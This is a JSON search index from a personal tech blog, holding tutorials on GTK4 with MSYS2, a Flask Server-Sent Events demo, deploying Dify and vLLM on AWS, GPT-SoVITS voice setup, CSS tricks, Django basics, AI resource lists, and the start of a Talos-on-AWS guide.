[{"body":"","link":"https://blog.wisekee.com/","section":"","tags":null,"title":""},{"body":"","link":"https://blog.wisekee.com/tags/c/","section":"tags","tags":null,"title":"C"},{"body":"","link":"https://blog.wisekee.com/tags/gtk/","section":"tags","tags":null,"title":"GTK"},{"body":"","link":"https://blog.wisekee.com/tags/gui/","section":"tags","tags":null,"title":"GUI"},{"body":"","link":"https://blog.wisekee.com/post/","section":"post","tags":["index"],"title":"Posts"},{"body":"","link":"https://blog.wisekee.com/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"Environment Preparing Download and installation the Msys2 After install the wsys2 open and create shortcut ucrt64.exe to desktop In ucrt64.exe console shell use pacman to install packages 1 2pacman -Syu 3#Repeat this step until all packages are up to date. 4#Follow any given instructions Installation the essential packages 1 2 pacman -S mingw-w64-x86_64-gtk4 3 pacman -S mingw-w64-x86_64-toolchain base-devel Test and verify the packages 1 gcc --version 2 #Discovers the directories where the GTK include files are stored. 3 pkg-config gtk4 --cflags 4 #Discovers the names of the GTK library files. 5 pkg-config gtk4 --libs 6 #Of course we can combine both commands to receive a bundled output 7 pkg-config gtk4 --cflags --libs Set system environment variable Open the sysdm.cpl in search bar or press WIN+R key TO Advanced \u0026gt; Environment Variables Add C:\\msys64\\ucrt64\\bin to path environment variable Write a helloworld-gtk.c gtk c code 1#include \u0026lt;gtk/gtk.h\u0026gt; 2 3static void 4print_hello (GtkWidget *widget, 5 gpointer data) 6{ 7 g_print (\u0026#34;Hello World\\n\u0026#34;); 8} 9 10static void 11activate (GtkApplication *app, 12 gpointer user_data) 13{ 14 GtkWidget *window; 15 GtkWidget *button; 16 17 window = gtk_application_window_new (app); 18 gtk_window_set_title (GTK_WINDOW (window), \u0026#34;Hello\u0026#34;); 19 gtk_window_set_default_size (GTK_WINDOW (window), 200, 200); 20 21 button = gtk_button_new_with_label (\u0026#34;Hello World\u0026#34;); 22 g_signal_connect (button, \u0026#34;clicked\u0026#34;, G_CALLBACK (print_hello), NULL); 23 gtk_window_set_child (GTK_WINDOW (window), button); 24 25 gtk_window_present (GTK_WINDOW (window)); 26} 27 28int 29main (int argc, 30 char **argv) 31{ 32 GtkApplication *app; 33 int status; 34 35 app = gtk_application_new (\u0026#34;org.gtk.example\u0026#34;, G_APPLICATION_DEFAULT_FLAGS); 36 g_signal_connect (app, \u0026#34;activate\u0026#34;, G_CALLBACK (activate), NULL); 37 status = g_application_run (G_APPLICATION (app), argc, argv); 38 g_object_unref (app); 39 40 return status; 41} Compile and running in ucrt64.exe shell Change current folder to code\u0026rsquo;s path 1# change to my code folder 2cd /c/mycode Execute compile and running the program 1# compile the code 2gcc $(pkg-config --cflags gtk4) -o hello-world-gtk helloworld-gtk.c $(pkg-config --libs gtk4) 3# execute 4./hello-world-gtk.exe Compile and running in cmd.exe windows command prompt the compile arguments can acquire use pkg-config gtk4 --cflags --libs in ucrt64.exe shell please replace the relative path to yourself code and installation path or disk driver name Caution: the command line compile arguments is in one line, don\u0026rsquo;t multiple lines\n1# exectue the compile in cmd.exe, please use Administrator permission in this cmd.exe indtance window 2D:\\msys64\\ucrt64\\bin\\gcc.exe c:\\Users\\tom\\mygtk-project\\main.c -o c:\\Users\\tom\\mygtk-project\\main.exe -I\u0026#34;D:/msys64/ucrt64/include\u0026#34; -I\u0026#34;D:/msys64/ucrt64/lib/gcc/x86_64-w64-mingw32/14.2.0/include\u0026#34; -I\u0026#34;D:/msys64/ucrt64/include/glib-2.0\u0026#34; -ID:/msys64/ucrt64/include/gtk-4.0 -ID:/msys64/ucrt64/include/pango-1.0 -ID:/msys64/ucrt64/include/fribidi -ID:/msys64/ucrt64/include/harfbuzz -ID:/msys64/ucrt64/include/gdk-pixbuf-2.0 -ID:/msys64/ucrt64/include/webp -DLIBDEFLATE_DLL -ID:/msys64/ucrt64/include/cairo -ID:/msys64/ucrt64/include/freetype2 -ID:/msys64/ucrt64/include/libpng16 -ID:/msys64/ucrt64/include/pixman-1 -ID:/msys64/ucrt64/include/graphene-1.0 -ID:/msys64/ucrt64/lib/graphene-1.0/include -mfpmath=sse -msse -msse2 -ID:/msys64/ucrt64/include/glib-2.0 -ID:/msys64/ucrt64/lib/glib-2.0/include -lgtk-4 -lpangowin32-1.0 -lpangocairo-1.0 -lpango-1.0 -lharfbuzz -lgdk_pixbuf-2.0 -lcairo-gobject -lcairo -lvulkan-1.dll -lgraphene-1.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0 -lintl Compile and debug in Dev-C++ IDE Please download suit windows 10 above Dev-C++ version in Win10 Dev-C++ version New a C project in Dev-C++ Add the main.c source code Setup the project property in Project menu and Project Options -\u0026gt; Parameters tab Paste the C compiler and Linker arguments from above execution the pkg-config gtk4 --cflags and pkg-config gtk4 --libs acquire, must be one line in textbox Create a new Compiler use ucrt64 environments refere to Tools -\u0026gt; Compiler options From folder to create compiler settings button Reference Msys2 Gtk installation Setup a gtk application written in c GUI development with Rust and GTK 4 Use Devc++ to create gtk app Win10 above Dev-C++ IDE ","link":"https://blog.wisekee.com/post/use-gtk-wingw64/","section":"post","tags":["GTK","C","GUI"],"title":"Use c language and GTK4,Msys2 to development lightweight Windows GUI app"},{"body":"","link":"https://blog.wisekee.com/tags/practice/","section":"tags","tags":null,"title":"Practice"},{"body":"Step by Step to study programming or learning one tools or technology\nSome playgrounds website Play with Docker Classroom killercoda: Interactive environments For tech you study, teach or present ximiuz labs oreilly learning platform play-with-kubernetes Build real projects ","link":"https://blog.wisekee.com/post/online-interactive-tutorial/","section":"post","tags":["Tutorial","Practice"],"title":"Some online interactive tutorial for programming"},{"body":"","link":"https://blog.wisekee.com/tags/tutorial/","section":"tags","tags":null,"title":"Tutorial"},{"body":"","link":"https://blog.wisekee.com/tags/html/","section":"tags","tags":null,"title":"HTML"},{"body":"","link":"https://blog.wisekee.com/tags/sse/","section":"tags","tags":null,"title":"SSE"},{"body":"","link":"https://blog.wisekee.com/tags/stream/","section":"tags","tags":null,"title":"STREAM"},{"body":"SSE establishes a one-way communication channel from server to client over HTTP. Unlike WebSockets\u0026rsquo; bidirectional connection, SSE maintains an open HTTP connection for server-to-client updates. Think of it as a radio broadcast: the server (station) transmits, and clients (receivers) listen. The LLM completion API is most use SSE event to interactive with human in chat web ui\nThe directory level look like following this 1├── bin 2│ ├── Activate.ps1 3│ ├── activate 4│ ├── activate.csh 5│ ├── activate.fish 6│ ├── flask 7│ ├── pip 8│ ├── pip3 9│ ├── pip3.12 10│ ├── python -\u0026gt; python3 11│ ├── python3 -\u0026gt; /opt/homebrew/Caskroom/miniconda/base/bin/python3 12│ └── python3.12 -\u0026gt; python3 13├── include 14│ └── python3.12 15├── lib 16│ └── python3.12 17│ └── site-packages 18├── pyvenv.cfg 19├── server.py 20├── static 21│ └── js 22│ └── client.js 23└── templates 24 └── index.html The Server endpoint code 1#!/usr/bin/env python 2 3from flask import Flask, Response, Request, render_template, stream_with_context 4import logging 5import time 6import random 7 8 9app = Flask(__name__) 10logging.basicConfig(level=logging.DEBUG) 11 12@app.route(\u0026#39;/\u0026#39;) 13def home(): 14 return render_template(\u0026#39;index.html\u0026#39;) 15 16def generate_random_data(): 17 while True: 18 data = f\u0026#34;data: Random value:{random.randint(1,100)}\\n\\n\u0026#34; 19 app.logger.info(data) 20 yield data 21 time.sleep(1) 22 23@app.route(\u0026#39;/stream\u0026#39;) 24def stream(): 25 return Response( 26 stream_with_context(generate_random_data()), 27 mimetype=\u0026#39;text/event-stream\u0026#39; 28 ) 29 30if __name__ == \u0026#39;__main__\u0026#39;: 31 app.run(debug=True) The client html code 1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;title\u0026gt;Testing the SSE\u0026lt;/title\u0026gt; 5 \u0026lt;script src=\u0026#34;{{ url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;js/client.js\u0026#39;) }}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 6 \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; 7 #data { 8 margin: 10px; 9 width: 300px; 10 height: 500px; 11 overflow: scroll; 12 border: 1px solid #880022; 13 } 14 \u0026lt;/style\u0026gt; 15\u0026lt;/head\u0026gt; 16 17\u0026lt;body\u0026gt; 18 \u0026lt;button onclick=\u0026#34;closeConnection()\u0026#34;\u0026gt;Close the SSE\u0026lt;/button\u0026gt; 19 \u0026lt;button onclick=\u0026#34;startConnection()\u0026#34;\u0026gt;Start the SSE\u0026lt;/button\u0026gt; 20 \u0026lt;button onclick=\u0026#34;cleanTheData()\u0026#34;\u0026gt;Clean the data\u0026lt;/button\u0026gt; 21 \u0026lt;div id=\u0026#34;data\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 22 23\u0026lt;/body\u0026gt; 24 25\u0026lt;/html\u0026gt; The interactive client.js contents 1let eventSource = null; 2 3// Clean up when done 4function closeConnection(event) { 5 console.log(\u0026#34;The close button is clicked\u0026#34;, event) 6 eventSource.close(); 7} 8 9function startConnection(evt) { 10 eventSource = new EventSource(\u0026#34;/stream\u0026#34;); 11 eventSource.onmessage = function(event) { 12 const dataDiv = document.getElementById(\u0026#34;data\u0026#34;); 13 dataDiv.innerHTML += `\u0026lt;p\u0026gt;${event.data}\u0026lt;/p\u0026gt;`; 14 dataDiv.scrollTop = dataDiv.scrollHeight; 15 }; 16 17 eventSource.onerror = function(error) { 18 if (eventSource.readyState === EventSource.CLOSED) { 19 console.log(\u0026#34;Connection was closed\u0026#34;); 20 } 21 console.error(\u0026#34;SSE error:\u0026#34;, error) 22 } 23 24 let retryAttempts = 0; 25 const maxRetries = 5; 26 27 eventSource.onclose = function() { 28 if (retryAttempts \u0026lt; maxRetries) { 29 setTimeout(() =\u0026gt; { 30 // Reconnect logic 31 retryAttempts++; 32 }, 1000 * retryAttempts); 33 } 34 }; 35} 36 37function cleanTheData() { 38 document.getElementById(\u0026#34;data\u0026#34;).innerHTML = \u0026#34;\u0026#34;; 39} ","link":"https://blog.wisekee.com/post/the-server-sent-events/","section":"post","tags":["SSE","HTML","STREAM"],"title":"The SSE(server sent event) example"},{"body":"","link":"https://blog.wisekee.com/tags/dify/","section":"tags","tags":null,"title":"Dify"},{"body":"","link":"https://blog.wisekee.com/tags/gpt/","section":"tags","tags":null,"title":"GPT"},{"body":"The first step launch the AWS ec2 type G4dn-xlarge 1# initialization the default ebs volume 2sudo file -s /dev/nvme2n1 3lsblk -f 4mkfs -t xfs /dev/nvme2n1 5mount /dev/nvme2n1 /mnt 6 7# persistent the mount info to `/etc/fstab` 8# view the UUID 9blkid 10 11# write the information 12echo \u0026#34;UID=xxxxx-3047-437a-81f0-xxxxx /mnt xfs defaults,nofail 0 2\u0026#34; \u0026gt;\u0026gt; /etc/fstab Extends the root ebs volume 1# modify the ebs volume size in aws console 2# extend the partition 3growpart /dev/nvme0n1 1 4# extend thf filesystem 5resize2fs /dev/nvme0n1p1 Install the docker-ce 1# Add Docker\u0026#39;s official GPG key: 2sudo apt-get update 3sudo apt-get install ca-certificates curl 4sudo install -m 0755 -d /etc/apt/keyrings 5sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc 6sudo chmod a+r /etc/apt/keyrings/docker.asc 7 8# Add the repository to Apt sources: 9echo \\ 10 \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\ 11 $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; | \\ 12 sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null 13sudo apt-get update 14sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 15 16sudo docker run hello-world Install the nvidia-driver 1sudo apt-get install -y nvidia-driver-525 nvidia-dkms-525 2# to view the GPU information 3nvidia-smi Enable the docker GPU runtime Reference the Nvidia Container ToolKit: GPU Runtime 1# Add Nvidia repo to system 2distribution=ubuntu22.04 \u0026amp;\u0026amp; \\ 3curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \u0026amp;\u0026amp; \\ 4curl -s -L https://nvidia.github.io/libnvidia-container/$distribution/libnvidia-container.list | sed \u0026#39;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g\u0026#39; | sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list 5# install the Nvidia container toolkit 6sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install -y nvidia-container-toolkit 7# configure the docker runtime 8sudo nvidia-ctk runtime configure --runtime=docker 9# restart the docker daemon 10sudo systemctl restart docker 11docker info | grep Runtimes Prepare the pytorch environment 1# pull the full functional docker image 2docker pull pytorch/pytorch:2.4.0-cuda12.1-cudnn9-runtime 3# create local host path to mount to container 4mkdir -p /mnt/models 5# running the docker container 6docker run --gpus=all -it -v /mnt/models:/models -p 8000:8000 pytorch/pytorch:2.4.0-cuda12.1-cudnn9-runtime bash 7# install huggingface cli in container 8pip install huggingface_hub[cli] Download the Model in Huggingface from container 1huggingface-cli download Qwen/Qwen2.5-7B-Instruct --local-dir=./Qwen2.5-7B-Instruct/ --cache-dir=./cache --local-dir-use-symlinks=False --resume-download 2huggingface-cli download facebook/opt-125m --local-dir=./opt-125m/ --cache-dir=./cache --local-dir-use-symlinks=False --resume-download Launch the LLM model 1# in container `/models/Qwen2.5-7B-Instruct` folder 2# make sure the model folder is in current path 3# if the GPU is old maybe add the --dtype float 4vllm serve Qwen2.5-7B-Instruct/ --dtype float 5vllm serve opt-125m/ --dtype float Launch the Dify LLM platform use docker-compose view the docs: Dify docker compose 1git clone https://github.com/langgenius/dify.git 2cd dify/docker 3cp .env.example .env 4docker compose up -d 5 6docker compose ps Access the Dify: http://your ip/install Reference nvidia container nvidia hub pytorch image ","link":"https://blog.wisekee.com/post/dify-vllm-ec2/","section":"post","tags":["Dify","vllm","GPT"],"title":"Setup the Dify and vllm in AWS G4dn instance"},{"body":"","link":"https://blog.wisekee.com/tags/vllm/","section":"tags","tags":null,"title":"vllm"},{"body":"Features: (GPT-SoVITS)[https://github.com/RVC-Boss/GPT-SoVITS]\nZero-shot TTS: Input a 5-second vocal sample and experience instant text-to-speech conversion. Few-shot TTS: Fine-tune the model with just 1 minute of training data for improved voice similarity and realism. Cross-lingual Support: Inference in languages different from the training dataset, currently supporting English, Japanese, Korean, Cantonese and Chinese. WebUI Tools: Integrated tools include voice accompaniment separation, automatic training set segmentation, Chinese ASR, and text labeling, assisting beginners in creating training datasets and GPT/SoVITS models. Install in local Clone the repo: git clone https://github.com/RVC-Boss/GPT-SoVITS.git Setup the virtual enviroment 1conda create -n GPTSoVits python=3.9 2conda activate GPTSoVits 3bash install.sh 4# or use the china pypi source to installation 5# pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt Download the pretrained models to GPT_SoVITS/pretrained_models sub folder 1# in GPTSoVits virtual environment to operations 2pip install -U huggingface_hub 3export HF_ENDPOINT=https://hf-mirror.com 4# this following command sould be download the huggingface repo and move to local relative directory 5# The HuggingFace url: https://huggingface.co/lj1995/GPT-SoVITS/tree/main 6huggingface-cli download --resume-download lj1995/GPT-SoVITS --local-dir /GPT-SoVITS/GPT_SoVITS/pretrained_models Upload the human voice sample model 1# for example: this is chinese voice sample model data 2# https://huggingface.co/baicai1145/GPT-SoVITS-STAR/tree/main 3# Download one of some and upload to `GPT-SoVITS/char_model/example001` sub folder 4# uncompress the files to get the: `*.pth` and `*.ckpt` and reference voice `*.wav` 5huggingface-cli download --resume-download baicai1145/GPT-SoVITS-STAR 三月七.zip --local-dir /GPT-SoVITS/char_model/ Launch the GPT-SoVITS api 1# this command should start the GPT-SoVITS api service in 9880 2# and should laod the model weights 3python api_v2.py Load the human voice role weights use api 1# use previously human voice model 2curl -X GET https://xxxx.ngrok-free.app/set_gpt_weights?weights_path=char_model/yq/yq-e10.ckpt To testing generate the voice 1curl -x GET https://xxxx.ngrok-free.app/tts?text=Hello There, nice to meet you\u0026amp;text_lang=zh\u0026amp;ref_audio_path=char_model/yq/ref/yq01.wav\u0026amp;prompt_lang=zh\u0026amp;top_k=5\u0026amp;top_p=1\u0026amp;temperature=1\u0026amp;text_split_method=cut1\u0026amp;batch_size=1\u0026amp;batch_threshold=0.75\u0026amp;split_bucket=true\u0026amp;speed_factor=1\u0026amp;fragment_interval=0.3\u0026amp;seed=-1\u0026amp;media_type=wav\u0026amp;streaming_mode=false\u0026amp;repetition_penalty=1.35\u0026amp;parallel_infer=true Use the GTP-SoVITS to train our own voice model Start the webui 1# this sould be launch the webui in local: 9874 2python webui.py Launch the Ngrok to inverse proxy to access 1ngrok http --url=xxxxx.ngrok-free.app 9874 Access the webui and start the train Upload the source voice (*.wav) format to server folder and fill into the Audio slicer input for example: GPT-SoVITS/data/common/six-movies.wav Step by Step in webui 0-Fetch dataset panel, main change the input path over *.wav files to save the folder path Uninstall the ctranslate2==4.5.0 for the whisper if use faster whisper 1# reinstall the ctranslate2 if appearance error 2# Unable to load any of {libcudnn_ops.so.9.1.0, libcudnn_ops.so.9.1, libcudnn_ops.so.9, libcudnn_ops.so} 3conda activate GPTSoVits 4pip uninstall ctranslate2 5pip install ctranslate2==4.4.0 Check and labeling in the webui, let Ngrok bind to the 9871 port verify the text and voice is correct, and submit the text or continue check click the next idex 1ngrok http --url=xxxxx.ngrok-free.app 9871 Go to the 1-GPT-SOVITS-TTS panel To ordinal click the 1Aa-Text buttons and wait complete Final click the One-click formatting Go to the 1B-Fine-tuned training panel Start the 1Ba-SoVITS and 1Bb-GPT training Wait the process complete Go to the 1C-inference panel Refreshing model paths to select previously traing model comon-tts models Start Open TTS Inference WebUI Change the Ngrok to bind to 9872 port Testing and inference the models Upload the source wav format voice (can download from slicer_opt) Type the test text Maybe to download the nltk data if the text include multiple languages 1# download the nltk data 2# maybe (You know) use this url: git clone http://gitclone.com/github.com/nltk/nltk_data.git 3git clone https://github.com/nltk/nltk_data 4# delete the exist packages 5rm -rf /root/nltk_data/corpora 6rm -rf /root/nltk_data/taggers/ 7# override the packages 8mv -f ./packages/* /root/nltk_data/ uncompress the *.zip file in /root/nltk_data use shell command Or you can uncompress the /root/nltk_data/taggers/averaged_perceptron_tagger_eng.zip if you use chinese and english mix only 1#!/usr/bin/env bash 2for zipfile in $(find /root/nltk_data -name \u0026#34;*.zip\u0026#34;); do 3 unzip -o \u0026#34;$zipfile\u0026#34; -d \u0026#34;$(dirname \u0026#34;$zipfile\u0026#34;)\u0026#34; 4done Use Ngrok to inverse proxy to access from external (Ngrok)[https://dashboard.ngrok.com/] Install the Ngrok command line interface to local copy from ngrok dashboard Launch the ngrok client ngrok http http://127.0.0.1:9880 ","link":"https://blog.wisekee.com/post/setup-gpt-sovits/","section":"post","tags":["LLM","TTS","VOICE"],"title":"How to setup the TTS LLM model GPT-SoVITS"},{"body":"","link":"https://blog.wisekee.com/tags/llm/","section":"tags","tags":null,"title":"LLM"},{"body":"","link":"https://blog.wisekee.com/tags/tts/","section":"tags","tags":null,"title":"TTS"},{"body":"","link":"https://blog.wisekee.com/tags/voice/","section":"tags","tags":null,"title":"VOICE"},{"body":"","link":"https://blog.wisekee.com/tags/css/","section":"tags","tags":null,"title":"css"},{"body":"This is for notes, and may be use the AI agent or chat to explain some rules.\nThe some css rule syntax 1/* The css background gradient */ 2background: repeating-linear-gradient( 3 var(--first-color) 0%, 4 var(--first-color) 40%, 5 var(--second-color) 40%, 6 var(--second-color) 80% 7); The example of some css rules 1/* Define the variables in root level can inherit to sibling */ 2:root { 3 --building-color1: #aa80ff; 4 --building-color2: #66cc99; 5 --building-color3: #cc6699; 6} 7 8/* resetting the box model */ 9*{ 10 box-sizing: border-box; 11 font-family: sans-serif; 12} 13 14/* or use the pseudo selector to do this */ 15*, ::before, ::after{ 16 box-sizing: inherit; 17} 18 19/* 20pseudo select for specific class 21This property is for screen reader 22*/ 23span[class~=\u0026#34;sr-only\u0026#34;] { 24 border: 0; 25 /* clip the elements */ 26 clip: rect(1px, 1px, 1px, 1px); /* creates a 1px by 1px clipping rectangle, essentially hiding everything except for a very tiny area. */ 27 /* */ 28 clip-path: inset(50%); 29 30 width: 1px; 31 height: 1px; 32 overflow: hidden; 33 white-space: nowrap; 34 position: absolute; 35 padding: 0; 36 margin: -1px; 37} 38 39/* flex box layout */ 40h1 .flex{ 41 display: flex; 42 flex-direction: column-reverse; 43 gap: 1rem; 44 background: linear-gradient( 45 orange, 46 var(--building-color1), 47 var(--window-color1) 48 ); 49} 50 51.bb1 { 52 width: 10%; 53 height: 70%; 54 display: flex; 55 flex-direction: column; 56 align-items: center; 57} 58 59/* first element that matches the selector */ 60h1 .flex span:first-of-type{ 61 font-size: 0.7em; 62 background-color: var(--building-color1); /* define a css variable ===\u0026gt; --building-color1: #999; */ 63} 64 65/* last element that matches the selector */ 66h1 .flex span:last-of-type{ 67 font-size: 1.2em; 68} 69 70/* flex box layout and set the flex-end; */ 71#years{ 72 display: flex; 73 justify-content: flex-end; 74 position: sticky; 75 z-index: 999; 76 top: 0; 77 margin: 0 -2px; 78 padding: 0.5rem calc(1.25rem + 2px) 0.5rem 0; 79} 80 81.cat-head { 82 border: 1px solid #000; 83 border-radius: 46%; 84 background: linear-gradient(to bottom, #5e5e5e 85%, #45454f 100%); /* linear-gradient(298deg, rgba(255, 122, 24, .25), #fff) */ 85} 86 87.cat-left-ear{ 88 position: absolute; 89 top: -26px; 90 left: -31px; 91 border-top-left-radius: 90px; 92 border-top-right-radius: 10px; 93 border-bottom: 70px solid #5e5e5e; 94 transform: rotate(-45deg); 95} 96 97.cat-left-eye { 98 position: absolute; 99 top: 54px; 100 left: 39px; 101 border-radius: 60%; 102 transform: rotate(25deg); 103 width: 30px; 104 height: 40px; 105 background-color: #000; 106} 107 108.cat-mouth div { 109 width: 30px; 110 height: 50px; 111 border: 2px solid #000; 112 border-radius: 190%/190px 150px 0 0; 113 border-color: black transparent transparent transparent; 114} 115 116.cat-mouth div { 117 width: 30px; 118 height: 50px; 119 border: 2px solid #000; 120 border-radius: 190%/190px 150px 0 0; 121 border-color: black transparent transparent transparent; 122} 123 124/* media query to set different sytyle */ 125@media (max-width: 1199px) and (min-width: 769px) { 126 #piano{ 127 width: 675px; 128 } 129 .keys{ 130 width: 633px; 131 } 132} The Flexbox layout example The html structure 1\u0026lt;ul class=\u0026#34;navigation\u0026#34;\u0026gt; 2 \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 3 \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 4 \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Products\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 5 \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 6\u0026lt;/ul\u0026gt; The css styles 1navigation { 2 display: flex; 3 flex-flow: row wrap; 4 justify-content: flex-end; 5 6 list-style: none; 7 margin: 0; 8 background: deepskyblue; 9} 10 11.navigation a { 12 text-decoration: none; 13 display: block; 14 padding: 1em; 15 color: white; 16} 17 18.navigation a:hover { 19 background: #1565C0; 20} 21 22@media all and (max-width: 800px) { 23 .navigation { 24 justify-content: space-around; 25 } 26} 27 28@media all and (max-width: 600px) { 29 .navigation { 30 flex-flow: column wrap; 31 padding: 0; 32 } 33 .navigation a { 34 text-align: center; 35 padding: 10px; 36 border-top: 1px solid rgba(255, 255, 255,0.3); 37 border-bottom: 1px solid rgba(0, 0, 0, 0.1); 38 } 39 .navigation li:last-of-type a { 40 border-bottom: none; 41 } 42} Add small mark sign 1/* 2 3\u0026lt;pre rel=\u0026#34;CSS\u0026#34; class=\u0026#34;wp-block-csstricks-code-block language-css\u0026#34; data-line=\u0026#34;\u0026#34;\u0026gt;/pre\u0026gt; 4 5*/ 6pre[rel]:not([rel=\u0026#34;\u0026#34;]):before { 7 font-family: MD Primer Bold, Rubik, Lato, Lucida Grande, Lucida Sans Unicode, Tahoma, Sans-Serif; 8 font-style: normal; 9 font-weight: 700; 10 font-size: .5rem; 11 content: attr(rel); 12 color: #fff; 13 position: absolute; 14 top: -.2rem; 15 right: .4rem; 16 padding: 0; 17 color: #ff7a18 !important; 18} Basic rules :checked :checked { background-color: yellow; } for the input elements checked, checkbox, radio\n[href^=\u0026quot;http\u0026quot;] { color: purple; } All href attribute prefix is: http in the first tr:nth-child(odd) { background-color: lightgray; } All odd lines in table ","link":"https://blog.wisekee.com/post/css_trick/","section":"post","tags":["css","stylesheet"],"title":"Some css reset or tricks in projects"},{"body":"","link":"https://blog.wisekee.com/tags/stylesheet/","section":"tags","tags":null,"title":"stylesheet"},{"body":"","link":"https://blog.wisekee.com/tags/django/","section":"tags","tags":null,"title":"Django"},{"body":"Create project scaffolding Create the project folder and initialization the virtual environment 1 2# Create the project directory 3mkdir djangoApp 4cd djangoApp 5 6# Initialization the virtual environment 7python -m venv ~/.venv/global 8source ~/.venv/global/bin/activate 9 10# Install the Django framework 11pip install django Create the project 1mkdir myDjangoProject 2django-admin startproject mysite myDjangoProject 3cd myDjangoProject 4# create the app in project 5python manage.py startapp polls 6 7# can create another app in this project 8python manage.py startapp otherapp Apply the databases migrations 1# generate the migrations in migrations directory 2python manage.py makemigrations 3# or apply some single app migration 4python manage.py makemigrations polls 5 6# view one migrate sql 7# The sqlmigrate command doesn’t actually run the migration on your database 8python manage.py sqlmigrate polls 0001 9 10# apply the migrations 11python manage.py migrate Run local development server 1python manage.py runserver Use the api in python shell 1python manage.py shell 2 3from polls.models import Choice, Question 4q = Question(question_text=\u0026#34;What\u0026#39;s new?\u0026#34;, pub_date=timezone.now()) 5q.save() 6q.id 7q.question_text 8q.pub_date 9q.question_text = \u0026#34;What\u0026#39;s up?\u0026#34; 10q.save() 11 12Question.objects.all() Administration the app 1# Create the superuser 2python manage.py createsuperuser ","link":"https://blog.wisekee.com/post/django-getting-stared/","section":"post","tags":["Python","Django","Framework"],"title":"Django getting started"},{"body":"","link":"https://blog.wisekee.com/tags/framework/","section":"tags","tags":null,"title":"Framework"},{"body":"","link":"https://blog.wisekee.com/tags/python/","section":"tags","tags":null,"title":"Python"},{"body":"","link":"https://blog.wisekee.com/tags/image/","section":"tags","tags":null,"title":"Image"},{"body":"Large models related to image processing OmniGen: Unified Image Generation. FLUX.1 minimal inference code to run image generation Llama OCRAbout Document to Markdown OCR library with Llama 3.2 vision deepfaceAbout A Lightweight Face Recognition and Facial Attribute Analysis (Age, Gender, Emotion and Race) Library for Python PIXART-αFast Training of Diffusion Transformer for Photorealistic Text-to-Image Synthesis LTX-VideoDiT-based video generation model Hugging face playground: play ground ","link":"https://blog.wisekee.com/post/text_to_image_llm/","section":"post","tags":["LLM","Image","GPT"],"title":"Open source text to image and image LLM"},{"body":"","link":"https://blog.wisekee.com/tags/agi/","section":"tags","tags":null,"title":"AGI"},{"body":"","link":"https://blog.wisekee.com/tags/ai/","section":"tags","tags":null,"title":"AI"},{"body":"Basic knowledges MLflow: A Tool for Managing the Machine Learning Lifecycle Docs and getting started Introduction to Generative AI Machine Learning Ops Tools and Efficiency Discover, download, and run local LLMs Go ahead and axolotl questions A template for Metaflow cards Machine Learning Toolkit for Kubernetes LightGBM is a gradient boosting framework XGBoost is an optimized distributed gradient boosting library 1 min voice data can also be used to train a good TTS model Kokoro is a frontier TTS model for its size. It has 82 million parameters Open source framework and models The fastai deep learning library H2O is an Open Source, Distributed, Fast \u0026amp; Scalable Machine Learning Platform TensorFlow Tensors and Dynamic neural networks in Python with strong GPU acceleration machine learning in Python Scalable, Portable and Distributed Gradient Boosting (GBDT, GBRT or GBM) Library A fast, distributed, high performance gradient boosting plotting with Python ","link":"https://blog.wisekee.com/post/awesome-ai/","section":"post","tags":["LLM","AI","AGI"],"title":"Awesome AI's resoures"},{"body":"","link":"https://blog.wisekee.com/tags/aws/","section":"tags","tags":null,"title":"AWS"},{"body":"","link":"https://blog.wisekee.com/tags/k8s/","section":"tags","tags":null,"title":"K8s"},{"body":"","link":"https://blog.wisekee.com/tags/talos/","section":"tags","tags":null,"title":"talos"},{"body":"talos in aws\nthe all talos nodes don\u0026rsquo;t enable public ip, can use private subnet and vpc ip cidr\nOperate workflow ​\rInstallation the talosctl to operator machine talosctl Create aws resources VPC Subnet SecurityGroup NetworkLoadbalancer : listener tcp 443 forward to control plane nodes tcp: 6443 TargetGroup: for control plane port tcp: 6443 Setup the environment variables, the talosctl command generate config file need the Env Variables 1REGION=\u0026#34;us-east-1\u0026#34; 2VPC=\u0026#34;vpc-xxxxxx\u0026#34; 3SUBNET=\u0026#34;subnet-xxxxxx\u0026#34; 4AMI=`curl -sL https://github.com/siderolabs/talos/releases/download/v1.7.5/cloud-images.json | jq -r \u0026#39;.[] | select(.region == \u0026#34;\u0026#39;$REGION\u0026#39;\u0026#34;) | select (.arch == \u0026#34;amd64\u0026#34;) | .id\u0026#39;` 5SECURITY_GROUP=\u0026#34;sg-xxxxx\u0026#34; 6LOAD_BALANCER_ARN=\u0026#34;arn:aws:elasticloadbalancing:us-east-1:xxxxx:loadbalancer/net/talos-aws-tutorial-lb/xxxx\u0026#34; 